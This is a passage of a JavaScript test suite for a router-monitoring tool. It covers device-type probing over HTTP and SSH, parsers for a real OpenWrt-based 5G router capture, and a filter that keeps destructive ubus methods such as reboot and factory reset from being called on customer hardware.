    ok(capsFor('openwrt').includes('configBackup') && capsFor('openwrt').includes('wifiWrite'),
      'while backup and WiFi writes are, in that order: the undo shipped before the change');
  }
}

// ---- the prober --------------------------------------------------------------------------------
{
  const noSsh = async () => ({ ok: false, error: 'refused', unreachable: true, stdout: '' });
  const closed = async () => ({ open: false, reason: 'refused (nothing listening)' });
  const openOnly = (ports) => async (h, p) => ({ open: ports.includes(p), reason: 'refused (nothing listening)' });

  // Nothing there at all.
  const dead = await probeDevice({ host: '10.0.0.9' }, { tcpProbe: closed, httpRequest: async () => ({ status: 0, body: '' }), sshExec: noSsh });
  ok(!dead.ok && dead.suggested === null, 'a device that answers nothing suggests nothing');
  ok(/not on the overlay|is wrong|is down/.test(dead.summary), 'and the summary offers the real explanations');

  // MikroTik.
  const mt = await probeDevice({ host: '10.147.20.5', username: 'admin', password: 'x' }, {
    tcpProbe: openOnly([22, 443, 8291]),
    httpRequest: async ({ url }) => url.includes('/rest/system/resource')
      ? { status: 200, body: JSON.stringify({ version: '7.15.3', 'board-name': 'hEX S' }) }
      : { status: 404, body: '' },
    sshExec: noSsh
  });
  ok(mt.suggested === 'routeros' && mt.confidence === 'high', 'RouterOS is identified from its REST API');
  ok(mt.findings.some(f => f.ok && /Winbox/.test(f.check)), 'and port 8291 is noted as corroboration');

  // OpenWrt with ubus reachable over HTTP — the good case for the Katalyst.
  const session = 'b'.repeat(32);
  const owrt = await probeDevice({ host: '10.147.21.14', username: 'root', password: 'x' }, {
    tcpProbe: openOnly([22, 80, 443]),
    httpRequest: async ({ url, body }) => {
      if (!url.endsWith('/ubus')) return { status: 404, body: '' };
      const req = JSON.parse(body);
      const [, object, method] = req.params;
      if (object === 'session' && method === 'login')
        return { status: 200, body: JSON.stringify({ result: [0, { ubus_rpc_session: session }] }) };
      if (object === 'system' && method === 'board')
        return { status: 200, body: JSON.stringify({ result: [0, { model: 'Katalyst Spark K500A',
          release: { distribution: 'Katalyst', version: '1.4.2', description: 'Katalyst 1.4.2' } }] }) };
      if (object === 'iwinfo') return { status: 200, body: JSON.stringify({ result: [6] }) };  // ACL gap
      return { status: 200, body: JSON.stringify({ result: [0, {}] }) };
    },
    sshExec: noSsh
  });
  ok(owrt.suggested === 'openwrt' && owrt.transport === 'ubus over HTTP', 'OpenWrt over HTTP is identified');
  ok(owrt.board && owrt.board.distribution === 'Katalyst', 'and the vendor build names itself');
  ok(/Katalyst/.test(owrt.summary), 'which the summary passes on, since that is the thing worth knowing');
  ok(owrt.grantedObjects.includes('network.device') && !owrt.grantedObjects.includes('iwinfo'),
    'the ACL gap is reported precisely — this is the difference between "OpenWrt" and "usable"');

  // OpenWrt where the vendor closed the HTTP endpoint. SSH must rescue it.
  const sshOnly = await probeDevice({ host: '10.147.21.15', username: 'root', password: 'x' }, {
    tcpProbe: openOnly([22, 80]),
    httpRequest: async () => ({ status: 404, body: '' }),
    sshExec: async ({ argv }) => argv[0] === 'ubus'
      ? { ok: true, stdout: JSON.stringify({ model: 'Spark', release: { distribution: 'Katalyst', version: '1.4.2' } }) }
      : { ok: false, error: 'no' }
  });
  ok(sshOnly.suggested === 'openwrt' && /SSH/.test(sshOnly.transport), 'a closed HTTP endpoint falls through to SSH');
  ok(/removed or disabled/.test(sshOnly.summary), 'and the summary says why, so nobody debugs the HTTP path');

  // DD-WRT.
  const dd = await probeDevice({ host: '10.147.21.16', username: 'root', password: 'x' }, {
    tcpProbe: openOnly([22, 80]),
    httpRequest: async () => ({ status: 404, body: '' }),
    sshExec: async ({ argv }) => argv[0] === 'nvram'
      ? { ok: true, stdout: 'Shop AP\n' }
      : { ok: false, error: 'ubus: not found' }
  });
  ok(dd.suggested === 'ddwrt', 'nvram identifies DD-WRT');
  ok(/not/.test(dd.summary) && /monitoring/i.test(dd.summary), 'and the summary is honest about what it will not do');

  // Listening, but wrong password everywhere. Must NOT guess a platform.
  const wrongPw = await probeDevice({ host: '10.147.21.17', username: 'root', password: 'bad' }, {
    tcpProbe: openOnly([22, 80]),
    httpRequest: async ({ url }) => url.endsWith('/ubus')
      ? { status: 200, body: JSON.stringify({ result: [6] }) }
      : { status: 401, body: '' },
    sshExec: async () => ({ ok: false, authFailed: true, error: 'SSH rejected the username or password' })
  });
  ok(wrongPw.suggested === null, 'a device that will not let us in is not assigned a platform on a hunch');
  ok(/credentials/i.test(wrongPw.summary), 'the summary blames the credentials, which is what actually failed');
  ok(wrongPw.summary.indexOf('credentials') < wrongPw.summary.indexOf('ubus'),
    'and says so before anything else, since that is the thing to go and fix');
  ok(/probably OpenWrt/.test(wrongPw.summary),
    'while still passing on that the ubus endpoint answered — the device is nearly identified, just locked');

  // A 401 from a password-protected vendor UI must not be read as "this is a MikroTik". Assigning
  // the RouterOS driver here would make the poller fail forever against an API that never existed.
  const justAWebUi = await probeDevice({ host: '10.147.21.18', username: 'admin', password: 'x' }, {
    tcpProbe: openOnly([80]),
    httpRequest: async () => ({ status: 401, body: 'Unauthorized' }),
    sshExec: noSsh
  });
  ok(justAWebUi.suggested === null, 'a bare 401 is not accepted as proof of RouterOS');
  ok(justAWebUi.findings.some(f => /MIGHT/.test(f.detail)), 'it is recorded as a hint, and labelled as one');
}

// ---- what the real Katalyst Spark taught us ----------------------------------------------------
//
// The first probe of a live unit (KAT-K500A, OpenWrt 21.02-SNAPSHOT on GL.iNet XE3000 hardware)
// found SSH working and the ubus HTTP endpoint answering with something that was not ubus at all.
// Two defects showed up, both of which would have sent someone chasing the wrong thing.
{
  const openOnly = (ports) => async (h, p) => ({ open: ports.includes(p), reason: 'refused (nothing listening)' });
  const board = { model: 'KAT-K500A', board_name: 'glinet,xe3000-emmc', hostname: 'Spark', kernel: '5.4.211',
    release: { distribution: 'OpenWrt', version: '21.02-SNAPSHOT', target: 'mediatek/mt7981', description: 'OpenWrt 21.02-SNAPSHOT ' } };

  // DEFECT 1: "not a 404" was treated as "the ubus endpoint is there". The Spark's web UI answers
  // every unknown path with its own HTML, so the report said "the endpoint exists but login
  // failed" — pointing at the password, when the endpoint was never installed.
  // Saved as `admin` on purpose: that is what the device form pre-fills, and reproducing it here
  // is what makes the username mismatch below a real regression test rather than a hypothetical.
  const spark = await probeDevice({ host: '10.241.80.78', username: 'admin', password: 'x' }, {
    tcpProbe: openOnly([22, 80, 443, 8080, 8443]),
    httpRequest: async () => ({ status: 200, body: '<!DOCTYPE html><html><head><title>Spark</title></head><body>…</body></html>' }),
    sshExec: async ({ argv }) => {
      if (argv[0] === 'ubus' && argv[2] === 'call') return { ok: true, stdout: JSON.stringify(board) };
      if (argv[0] === 'ubus' && argv[1] === 'list')
        return { ok: true, stdout: ['network.device', 'network.interface', 'system', 'uci', 'session', 'iwinfo'].join('\n') };
      return { ok: false, error: 'no' };
    }
  });
  ok(spark.suggested === 'openwrt', 'the Spark is identified as OpenWrt');
  ok(spark.board.model === 'KAT-K500A', 'and names itself KAT-K500A');
  ok(/glinet|xe3000/.test(spark.board.board), 'with the OEM board visible underneath the branding');

  const httpFinding = spark.findings.find(f => /ubus over http$/.test(f.check));
  ok(httpFinding && httpFinding.endpointPresent !== true,
    'an HTML page is NOT reported as a working ubus endpoint');
  ok(/not ubus/.test(httpFinding.detail) && /HTML/.test(httpFinding.detail),
    'the finding says what actually answered, so nobody goes looking for a password problem');
  ok(/not installed/.test(httpFinding.detail), 'and names the real cause: uhttpd-mod-ubus is missing');

  // DEFECT 2: objects were only enumerated over HTTP, so an SSH-only device — the exact case this
  // was built for — reported nothing about what it could do.
  ok(Array.isArray(spark.grantedObjects), 'ubus objects are enumerated over SSH too, not only over HTTP');
  ok(spark.grantedObjects.includes('network.device'), 'and the list is the real one from `ubus list`');
  ok(spark.findings.some(f => f.check === 'ubus luci-rpc' && !f.ok),
    'a missing object is called out by name rather than left to be discovered by a failing poll');

  // The transport has to be REMEMBERED. Otherwise this device eats an HTTP timeout every minute.
  ok(spark.apply.mgmt_transport === 'ssh', 'the probe records that this device is reachable over SSH');
  ok(spark.apply.platform === 'openwrt', 'alongside the platform');

  // THE USERNAME. Identify logs into a non-MikroTik device as root; the device form pre-fills
  // `admin`, which is right for RouterOS. The result in production was an Identify that reported
  // the device perfectly beside a poll that failed with "SSH rejected the username or password" —
  // the two halves of one screen authenticating as different accounts.
  ok(spark.apply.admin_username === 'root', 'the probe reports which username actually worked');
  const note = spark.findings.find(f => /ubus over SSH/.test(f.check));
  ok(note.user === 'root' && note.usernameDiffers === true,
    'and flags that it differs from the one the device is saved with');
  ok(/will not work/.test(note.detail) && /root/.test(note.detail),
    'saying so in words, because a probe that succeeds otherwise looks like proof that polling will');

  // When they already agree, no correction is implied.
  const agreeing = await probeDevice({ host: '10.241.80.79', username: 'root', password: 'x' }, {
    tcpProbe: openOnly([22]),
    httpRequest: async () => ({ status: 0, body: '' }),
    sshExec: async ({ argv }) => argv[1] === 'list'
      ? { ok: true, stdout: 'system\nnetwork.device' }
      : { ok: true, stdout: JSON.stringify(board) }
  });
  ok(agreeing.apply.admin_username === 'root', 'a device already saved as root still reports root');
  ok(agreeing.findings.find(f => /ubus over SSH/.test(f.check)).usernameDiffers === false,
    'without claiming anything needs changing');

  // And a device that genuinely has ubus over HTTP must still say so.
  const withHttp = await probeDevice({ host: '10.0.0.2', username: 'root', password: 'x' }, {
    tcpProbe: openOnly([80]),
    httpRequest: async ({ url, body }) => {
      // The RouterOS check comes first and sends no body; only the ubus probe posts one.
      if (!body || !url.endsWith('/ubus')) return { status: 404, body: '' };
      const [, object, method] = JSON.parse(body).params;
      if (object === 'session' && method === 'login') return { status: 200, body: JSON.stringify({ result: [0, { ubus_rpc_session: 'c'.repeat(32) }] }) };
      return { status: 200, body: JSON.stringify({ result: [0, board] }) };
    },
    sshExec: async () => ({ ok: false, error: 'refused' })
  });
  ok(withHttp.apply.mgmt_transport === 'http', 'a device with a working HTTP endpoint records that instead');
}

// ---- the parsers, against output captured from a real Katalyst Spark ---------------------------
//
// test/fixtures/katalyst-k500a.json is a real capture (SSIDs, MACs and the public IP anonymised).
// Everything below failed against it before being fixed, and every one of those failures would have
// reached a technician's screen as a confident wrong answer rather than an error.
{
  const cap = JSON.parse(readFileSync('test/fixtures/katalyst-k500a.json', 'utf8'));
  const { classifyIface } = await import('../lib/drivers/openwrt.js');

  const board = parseBoard(cap.board);
  ok(board.model === 'KAT-K500A', 'the real board parses');
  ok(board.osVersion === 'OpenWrt 21.02-SNAPSHOT', 'and its version, with the trailing space trimmed off');

  // Asserted as properties, not as the exact numbers this capture happened to hold — the fixture
  // gets regenerated, and a test pinned to one day's uptime fails for no reason anyone cares about.
  const info = parseSysinfo(cap.info);
  ok(info.uptime > 86400, 'uptime parses, and this unit has been up for more than a day');
  ok(info.load1 > 0 && info.load1 < 4, 'load is divided down from fixed-point into a plausible range');
  ok(info.memTotal > 100e6, 'and memory is read');

  const devs = parseDevices(cap.device_status);
  const by = Object.fromEntries(devs.map(d => [d.name, d]));

  // 1. THE UNPLUGGED PORT. This build reports speed "-1F" when nothing is connected, and the
  //    original pattern rejected the minus sign and fell through to returning it verbatim — so an
  //    empty 2.5G WAN port displayed its link speed as "-1F".
  ok('speed' in cap.device_status.eth0 && cap.device_status.eth0.speed === '-1F',
    'the capture really does report -1F (guard against the fixture being edited)');
  ok(by.eth0.speed === '', '"-1F" is no link, not a speed');
  ok(by.eth0.running === false, 'and the port reads as down');
  ok(by.eth0.disabled === false, 'without being confused for administratively disabled');

  // 2. THE TYPE FIELD. This build answers the literal string "Network device" for everything, so
  //    trusting it tagged six radios as ethernet.
  ok(cap.device_status.ra0.type === 'Network device', 'the capture really does say "Network device"');
  ok(by.ra0.type === 'wifi' && by.rax0.type === 'wifi', 'MediaTek radio names are recognised as radios');
  ok(by['br-lan'].type === 'bridge', 'the bridge is a bridge');
  ok(by.rmnet_mhi0.type === 'cellular', 'and the 5G modem is identified as cellular, not as an ethernet port');
  ok(classifyIface('apcli0') === 'wifi' && classifyIface('apclix0') === 'wifi',
    'including the repeater client interfaces, which no mainline OpenWrt naming would match');

  // 3. THE OVERLAY. The ZeroTier interface claims 10 Mbit/s — a number the kernel invented.
  const zt = devs.find(d => d.type === 'overlay');
  ok(zt && /^zt/.test(zt.name), 'the ZeroTier interface is present and typed as an overlay');
  ok(cap.device_status[zt.name].speed === '10F', 'the capture really does claim 10 Mbit/s for it');
  ok(zt.speed === '', 'which is suppressed rather than shown next to real ports');

  ok(!devs.some(d => d.name === 'lo'), 'loopback is dropped — it is not a port');
  ok(by['br-lan'].rxBytes > 2 ** 32, 'byte counters survive past 2^32 — this bridge has passed 48 GB');
  ok(Number.isSafeInteger(by['br-lan'].rxBytes), 'and stay exact rather than losing precision');

  // 4. ADDRESSES. The public IP lives on the 5G modem interface, reached through a logical
  //    interface whose name matches nothing predictable ("modem_0001_4").
  const logical = parseInterfaceDump(cap.interface_dump);
  const merged = mergeInterfaces(devs, logical);
  const wan = merged.find(d => d.name === 'rmnet_mhi0');
  ok(wan.ips.length === 1 && /^203\.0\.113\./.test(wan.ips[0]), 'the public address lands on the modem interface');
  const defRoute = logical.find(l => l.gateway);
  ok(defRoute && defRoute.name === 'modem_0001_4', 'the default route identifies the WAN without guessing from the name');
  ok(merged.find(d => d.name === 'br-lan').ips[0] === '192.168.8.1', 'and the LAN address lands on the bridge');

  // 5. ENCRYPTION — the one that mattered most. This build omits the block entirely, and reading
  //    that as "open" would have told a technician a customer's WiFi was unencrypted.
  const ra0 = parseIwinfo('ra0', cap.iwinfo['ra0.info']);
  ok(!('encryption' in cap.iwinfo['ra0.info']), 'the capture really has no encryption block');
  ok(ra0.encryption === null, 'an absent encryption block is UNKNOWN');
  ok(ra0.encryption !== 'open', 'and is never reported as an open network');
  ok(parseIwinfo('x', { encryption: { enabled: false } }).encryption === 'open',
    'only an explicit enabled:false means open');
  ok(parseIwinfo('x', { encryption: { enabled: true, authentication: ['psk'], wpa: [2] } }).encryption.includes('psk'),
    'and a real encryption block still parses');

  // Asserted by structure, not by the anonymised name: which placeholder an SSID receives depends
  // on the order they were found in, and pinning it makes the test fail when the fixture is rebuilt
  // without anything actually being wrong.
  ok(ra0.ssid && ra0.band === '2ghz', 'the radio reads correctly otherwise');
  // Not pinned to a value: channel width changes as the radio adapts, and it did between captures.
  ok(ra0.standard === 'ax', 'including the WiFi generation — this is a WiFi 6 radio');
  ok(/^(HT|VHT|HE|EHT)\d+/.test(ra0.width), `and the channel width (${ra0.width}), which support gets asked about`);
  ok(parseIwinfo('rax0', cap.iwinfo['rax0.info']).band === '5ghz', 'and the 5 GHz radio is on 5 GHz');

  // 6b. WHICH SSIDs ARE ACTUALLY ON THE AIR.
  //
  // Confirmed against the owner's own knowledge of these units: the factory SSIDs on ra1/rax1 are
  // not broadcasting. Two independent signals in the capture agree — neither interface appears in
  // network.wireless status (not configured in UCI) nor in network.device status (no kernel
  // interface up). iwinfo lists them anyway, because the MediaTek driver pre-creates every virtual
  // AP whether or not anything uses it.
  {
    // Imported here: the later block's `const parseWirelessStatus` is in the same scope and would
    // otherwise be referenced before its own initialisation.
    const wl = await import('../lib/drivers/openwrt.js');
    const upIfaces = new Set(Object.keys(cap.device_status));
    const inUci = new Set(wl.parseWirelessStatus(cap.wireless_status).map(c => c.iface));

    ok(upIfaces.has('ra0') && upIfaces.has('rax0'), 'the customer radios are up in the kernel');
    ok(!upIfaces.has('ra1') && !upIfaces.has('rax1'),
      'the factory-default radios are NOT up — which is the decisive signal, and matches the owner');
    ok(inUci.has('ra0') && !inUci.has('ra1'), 'and UCI manages only the configured pair, agreeing independently');

    // iwinfo is what made them look real, so the trap is worth pinning.
    ok(cap.iwinfo['ra1.info'].ssid && cap.iwinfo['ra1.info'].mode === 'Master',
      'iwinfo reports the dormant radio with an SSID and Master mode — indistinguishable from a live one');
    ok(cap.iwinfo['ra1.info'].bssid, 'it even has a BSSID, so nothing about iwinfo alone gives it away');

    // Which is why the kernel is consulted rather than iwinfo trusted.
    const CAP3 = {
      'iwinfo.devices': { devices: ['ra0', 'ra1'] },
      'iwinfo.info': cap.iwinfo['ra0.info'],
      'network.wireless.status': cap.wireless_status,
      'network.device.status': cap.device_status
    };
    const t3 = { kind: 't', endpoint: 't', async call(o, m) { const k = `${o}.${m}`; return k in CAP3 ? { ok: true, data: CAP3[k] } : { ok: false, code: 4, error: 'nf' }; } };
    const d3 = createDriver({ mgmt_address: '10.0.0.9', admin_password: 'x' }, { transport: t3 });
    const w3 = await d3.wifi();
    const r0 = w3.radios.find(r => r.iface === 'ra0'), r1 = w3.radios.find(r => r.iface === 'ra1');
    ok(r0.broadcasting === true, 'the live radio is reported as broadcasting');
    ok(r1.broadcasting === false, 'and the dormant one is not');
    ok(r1.disabled === true, 'which also marks it disabled, so existing UI does not show it as normal');
    ok(r1.configured === false, 'with "not configured" recorded separately — a different question from "not on"');
    ok(w3.broadcasting === 1, 'and the count reflects what is on the air, not what the driver exposes');

    // When the kernel cannot be read, guessing is worse than admitting it.
    const t4 = { kind: 't', endpoint: 't', async call(o, m) {
      const k = `${o}.${m}`;
      if (o === 'network.device') return { ok: false, code: 6, error: 'permission denied' };
      return k in CAP3 ? { ok: true, data: CAP3[k] } : { ok: false, code: 4, error: 'nf' };
    } };
    const w4 = await createDriver({ mgmt_address: '10.0.0.9', admin_password: 'x' }, { transport: t4 }).wifi();
    ok(w4.radios.every(r => r.broadcasting === null),
      'with no kernel view, broadcasting is unknown rather than assumed either way');
    ok(!w4.radios.some(r => r.disabled === true && r.broadcasting === null),
      'and nothing is marked disabled on the strength of a reading that failed');
  }

  // 6. SIX RADIOS, TWO REAL. apcli0/apclix0 are the repeater client side with no SSID at all.
  const allRadios = cap.iwinfo_devices.devices.map(n => parseIwinfo(n, cap.iwinfo[n + '.info']));
  ok(allRadios.length === 6, 'this device exposes six radios');
  const shown = allRadios.filter(x => x.ssid || /master/i.test(x.mode));
  ok(shown.length === 4 && !shown.some(x => /client/i.test(x.mode)),
    'the blank client interfaces are filtered out of what gets shown');
  const rax0 = parseIwinfo('rax0', cap.iwinfo['rax0.info']);
  ok(ra0.ssid === rax0.ssid, 'the customer SSID is seen identically on both bands — one network, two radios');
  ok(allRadios.filter(x => x.ssid === ra0.ssid).length === 2, 'and on exactly those two');

  // 7. LEASES, both ways. luci-rpc is present on this build; the file is the fallback.
  const ll = parseLuciLeases(cap.luci_leases);
  ok(ll.length > 0, 'leases parse from luci-rpc');
  ok(ll[0].address.startsWith('192.168.8.') && ll[0].mac.includes(':'), 'with address and MAC');
  ok(/^\d+h\d+m$|^\d+m\d+s$|^\d+d/.test(ll[0].expires), 'and an expiry formatted like the RouterOS table');
  const lf = parseLeaseFile(cap.leases_file);
  ok(lf.length === ll.length, 'the lease FILE yields the same count, so the fallback agrees with luci-rpc');
  ok(lf.some(l => l.host === ''), 'a "*" hostname becomes blank rather than an asterisk');

  // 8. STATIONS.
  const st = parseAssoclist(cap.iwinfo['ra0.assoclist'], 'ra0');
  ok(st.length > 0, 'associated stations parse');
  ok(st.every(s => /^([0-9A-F]{2}:){5}[0-9A-F]{2}$/.test(s.mac)), 'every station MAC is normalised');
  ok(st[0].signal < 0, 'with a signal in dBm');

  // 9. The log, for the threat harvesting that comes later. dropbear's wording is not RouterOS's.
  ok(cap.ubus_list.includes('log') && cap.ubus_list.includes('iwinfo'),
    'the fixture records which ubus objects this build actually has');
  ok(cap.ubus_list.includes('file'),
    'the `file` object is present, so the lease fallback that reads /tmp/dhcp.leases has a route');

  // 10. THE ENCRYPTION FIX. iwinfo could not say whether this network was protected; UCI can, and
  //     says psk2. This is the difference between the device page admitting it does not know and
  //     the device page telling a technician the customer is on WPA2.
  const { parseWirelessStatus, describeEncryption } = await import('../lib/drivers/openwrt.js');
  const conf = parseWirelessStatus(cap.wireless_status);
  ok(conf.length === 2, 'both configured APs are read from network.wireless');
  ok(conf.every(c => c.encryption === 'psk2'), 'and both report psk2 — the fact iwinfo omitted');
  ok(new Set(conf.map(c => c.ssid)).size === 1 && conf[0].ssid, 'with one SSID across both bands');
  // The join that makes the merge work: UCI and iwinfo must agree about what is on ra0.
  ok(conf.find(c => c.iface === 'ra0').ssid === parseIwinfo('ra0', cap.iwinfo['ra0.info']).ssid,
    'and it matches what iwinfo reports for the same interface, which is what the merge relies on');
  ok(conf.find(c => c.iface === 'ra0') && conf.find(c => c.iface === 'rax0'),
    'keyed by interface name, which is how it joins to iwinfo');
  ok(conf.every(c => c.hidden === false), 'and reports whether the SSID is hidden, which iwinfo cannot');

  // THE PASSPHRASE. Read on purpose, and an earlier version of this driver refused to — which was
  // not a security decision but an inconsistency: the RouterOS reader has always returned it on
  // the same NOC-only, audited endpoint, so the WiFi page worked on one platform and not the other.
  //
  // What keeps it contained is that it is never STORED. The poll reduces each radio to
  // hasPassword; the secret is read on demand, by a privileged user, and logged.
  ok('key' in conf[0], 'the configured passphrase is available to the audited reveal');
  {
    const withKey = parseWirelessStatus({
      r: { config: {}, interfaces: [{ config: { ifname: 'ra0', ssid: 'X', encryption: 'psk2', key: 'hunter2' } }] }
    });
    ok(withKey[0].key === 'hunter2', 'and comes through when the device reports one');
    ok(parseWirelessStatus({ r: { config: {}, interfaces: [{ config: { ifname: 'ra0', ssid: 'X' } }] } })[0].key === '',
      'while an open network yields an empty key rather than undefined');
  }

  // The capture tool still strips it, so it cannot reach a committed fixture.
  const raw = readFileSync('test/fixtures/katalyst-k500a.json', 'utf8');
  const { auditFixture } = await import('../lib/anonymise.js');
  const leaks = auditFixture(raw);
  ok(leaks.length === 0, `the committed fixture holds nothing identifying${leaks.length ? ' — ' + leaks.join('; ') : ''}`);

  ok(describeEncryption('psk2') === 'WPA2', 'psk2 reads as WPA2');
  ok(describeEncryption('sae') === 'WPA3' && describeEncryption('sae-mixed') === 'WPA2/WPA3', 'WPA3 forms are named');
  ok(describeEncryption('none') === 'open', 'and "none" is genuinely open — the one case it is safe to say so');
  ok(describeEncryption(null) === null, 'while nothing reported stays unknown rather than becoming "open"');
  ok(/insecure/.test(describeEncryption('wep')), 'WEP is flagged rather than reported neutrally');

  // 11. The vendor's own client list knows things DHCP does not.
  const clients = Object.values(cap.gl_clients.clients || {});
  ok(clients.length > ll.length, 'gl-clients knows about more devices than DHCP has leases for');
  ok(clients.every(c => c.mac && typeof c.online === 'boolean'), 'each with a MAC and an online flag');
  ok(clients.some(c => typeof c.total_rx === 'number' && c.total_rx > 0),
    'and cumulative traffic counters, which is per-client usage the platform has no other source for');

  ok(cap.ubus_list.includes('network.wireless'),
    'and network.wireless exists, which is also where WiFi writing would go if it is added later');

  // 12. CELLULAR SIGNAL. The reason this hardware is worth monitoring at all: this unit runs on 5G,
  //     both ethernet ports dark, so signal IS the service.
  const { parseModemSignal, gradeSignal } = await import('../lib/drivers/openwrt.js');
  const sig = parseModemSignal(cap.modem_signal);
  ok(sig.available, 'the modem returns signal data');
  ok(sig.summary.count > 100, 'as a ring buffer of samples, not a single reading');
  ok(sig.summary.spanSeconds > 1500, 'covering about half an hour');
  ok(sig.samples[0].ts > sig.samples[sig.samples.length - 1].ts, 'newest first');

  // Ten-second resolution is FINER than this platform polls. Storing every sample rather than the
  // newest is what keeps a brief, sharp drop visible instead of averaged away.
  const gap = (Date.parse(sig.samples[0].ts) - Date.parse(sig.samples[1].ts)) / 1000;
  ok(gap <= 15, `samples are ${gap}s apart — finer than the one-minute poll, so all of them are kept`);

  ok(sig.latest.networkType === 'NR5G-NSA', 'the network type is read — this unit is on 5G non-standalone');
  ok(sig.latest.rsrp < -100 && sig.latest.rsrp > -120, 'with a plausible RSRP');
  ok(sig.summary.grades.rsrp === 'poor', 'which grades as poor — this customer has a weak signal, and it should say so');
  ok(sig.summary.overall === 'poor',
    'and the overall verdict takes the WORST component, not an average, because a good RSRP with bad SINR still does not work');
  ok(sig.summary.rsrp.avg < -100 && sig.summary.rsrp.min <= sig.summary.rsrp.avg, 'min/avg/max are consistent');

  ok(gradeSignal('rsrp', -75) === 'excellent' && gradeSignal('rsrp', -95) === 'fair', 'RSRP thresholds bracket correctly');
  ok(gradeSignal('sinr', 25) === 'excellent' && gradeSignal('sinr', -5) === 'poor', 'as do SINR thresholds');
  ok(gradeSignal('rsrp', null) === null, 'and a missing value grades as unknown rather than as poor');

  // A build reporting only some metrics must not have the rest invented.
  const partial = parseModemSignal({ signals: [{ timestamp: 1789514386, rssi: -70 }] });
  ok(partial.available && partial.latest.rssi === -70, 'a partial sample is still usable');
  ok(partial.latest.rsrp === null && partial.latest.sinr === null, 'and the absent metrics stay null, not zero');
  ok(parseModemSignal({}).available === false, 'no data is reported as unavailable rather than as a signal of zero');
  ok(parseModemSignal({ signals: [{ rsrp: -90 }] }).available === false, 'a sample with no timestamp is unusable and dropped');
}

// ---- discovering vendor ubus methods rather than guessing them ---------------------------------
//
// The first attempt at capturing 5G signal hardcoded `modem.signal status` and `gl-clients
// get_list`. Both came back with ubus status 3 — method not found. The objects existed; the names
// were invented. So the capture tool reads the signatures off the device instead, and the safety
// filter below decides what is safe to call blind — which matters, because this runs against live
// customer routers where a vendor object may well expose a factory reset.
{
  const { parseUbusVerboseList, isSafeMethod, planMethodCall, explainExit } =
    await import('../lib/ubusintrospect.js');

  const sample = [
    "'modem.signal' @7f3a1b2c",
    '\t"get_signal":{}',
    '\t"set_band":{"band":"String"}',
    "'system' @1a2b3c4d",
    '\t"board":{}',
    '\t"info":{}',
    '\t"reboot":{}',
    "'gl-clients' @deadbeef",
    '\t"get_list":{"type":"String"}'
  ].join('\n');

  const m = parseUbusVerboseList(sample);
  ok(Object.keys(m).length === 3, 'every object in a verbose listing is found');
  ok('get_signal' in m['modem.signal'], 'with its methods');
  ok(m['modem.signal'].set_band.band === 'String', 'and the argument signature, which says what a method needs');
  ok(Object.keys(m.system).length === 3, 'a second object is not merged into the first');
  ok(Object.keys(parseUbusVerboseList('')).length === 0, 'empty input is empty output, not a crash');
  ok(Object.keys(parseUbusVerboseList('garbage\nnot a listing')).length === 0, 'and neither is nonsense');

  // The safety filter. This is the part that runs against a customer's router, so it is tested as
  // the shipped function rather than as a copy of the regexes — a copy would keep passing after
  // the real one was loosened.
  for (const good of ['get_signal', 'status', 'info', 'list_clients', 'dump', 'show_config', 'get_status'])
    ok(isSafeMethod(good), `"${good}" reads as retrieval and is called`);

  // Every one of these would be a real action on live customer hardware.
  for (const bad of ['reboot', 'set_band', 'factory_reset', 'restart_service', 'delete_client',
                     'firmware_upgrade', 'reset', 'stop', 'apply_config', 'wipe_config'])
    ok(!isSafeMethod(bad), `"${bad}" is NEVER called blind`);

  // The subtle ones: names that START like a read and mutate anyway. A prefix-only check — the
  // obvious implementation — would have called all three on a customer's router.
  for (const trap of ['get_and_reset_stats', 'status_reset', 'info_update', 'list_and_clear'])
    ok(!isSafeMethod(trap), `"${trap}" — a reading prefix does not excuse a mutating verb later on`);

  // `scan` reads like a retrieval and is not. Running `repeater scan` on a live Katalyst performed
  // a real site survey: the radio goes off-channel, the customer's WiFi hiccups, and the neighbours'
  // SSIDs come back as a bonus. Learned by doing it.
  ok(!isSafeMethod('scan'), '"scan" is an action — it disturbs a live radio, however much it sounds like a read');
  ok(isSafeMethod('surveys'), 'while "surveys", the cached result, is the genuine read on that object');

  // Word matching, not substring matching. `service signal` sends a signal to a process;
  // `get_signals` reads 5G measurements. Substring matching cannot tell them apart, and the first
  // attempt at this blocklisted "signal" and immediately disqualified the reader it existed for.
  ok(!isSafeMethod('signal'), '"signal" alone is the verb — `service signal` sends one to a process');
  ok(isSafeMethod('get_signals'), 'but "get_signals" reads 5G measurements, and must not be caught by the same word');
  ok(isSafeMethod('get_signal'), 'singular too — position decides, not the presence of the word');
  ok(!isSafeMethod('scan'), 'the same rule blocks bare "scan"');
  ok(!isSafeMethod('teardown') && !isSafeMethod('setup'), 'setup and teardown are refused');
  ok(!isSafeMethod('dump_subscribe_attributes'), 'and so is subscribing, which creates state on the device');
  ok(isSafeMethod('dump_features') && isSafeMethod('get_speed'), 'while the plain readers on the same objects are allowed');

  const { methodWords } = await import('../lib/ubusintrospect.js');
  ok(methodWords('get_and_reset_stats').join(',') === 'get,and,reset,stats', 'snake_case splits into words');
  ok(methodWords('getSignalStrength').join(',') === 'get,signal,strength', 'and so does camelCase');
  ok(!isSafeMethod('do_something'), 'and a name that does not read as retrieval at all is skipped');
  ok(!isSafeMethod('') && !isSafeMethod(null) && !isSafeMethod(undefined),
    'a missing name is never treated as safe');

  ok(planMethodCall('get_signal', {}).call === true, 'a no-argument getter is called');
  ok(/read-only/.test(planMethodCall('reboot', {}).skip), 'an unsafe method is skipped, with the reason');

  // A ubus signature does not say which arguments are REQUIRED. Refusing everything that declares
  // any argument skipped `modem.signal get_signals` ({time}) and `service list` ({name, verbose}) —
  // both of which work fine with no arguments. Since the NAME has already been cleared of every
  // mutating verb, calling it without arguments risks nothing worse than an error.
  const withArgs = planMethodCall('get_signals', { time: 'Integer' });
  ok(withArgs.call === true, 'a read-only method that declares optional arguments is still called');
  ok(withArgs.argsOmitted.includes('time'), 'with the omitted argument recorded, so a failure is readable');
  ok(planMethodCall('list', { name: 'String', verbose: 'Boolean' }).call === true,
    '`service list` is reachable now rather than skipped');

  // But arguments are never INVENTED, and an unsafe name is not rescued by having a signature.
  ok(planMethodCall('set_band', { band: 'String' }).skip, 'a mutating method with arguments is still refused');
  ok(planMethodCall('upload_cloud_signals', { action: 'String' }).skip,
    'and so is one whose name does not read as retrieval — this exact method exists on the Katalyst');

  // The thing that started this: "exited 3" told us nothing.
  ok(/METHOD NOT FOUND/.test(explainExit({ code: 3 })), 'ubus status 3 is spelled out');
  ok(/permission/i.test(explainExit({ code: 6 })), 'as is a permissions failure');
